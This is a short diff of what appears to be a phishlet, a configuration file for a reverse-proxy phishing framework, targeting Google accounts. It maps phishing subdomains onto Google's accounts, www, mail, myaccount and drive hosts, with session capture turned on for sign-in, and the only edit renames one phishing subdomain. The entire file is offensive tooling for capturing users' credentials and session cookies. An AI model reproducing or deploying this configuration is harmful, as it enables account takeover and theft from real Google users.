@@ -3,7 +3,7 @@ author: '@an0nud4y'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false}
+  - {phish_sub: 'www4', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false}
   - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: false, is_landing: false}
   - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: false, is_landing: false}
   - {phish_sub: 'drive', orig_sub: 'drive', domain: 'google.com', session: false, is_landing: false} 
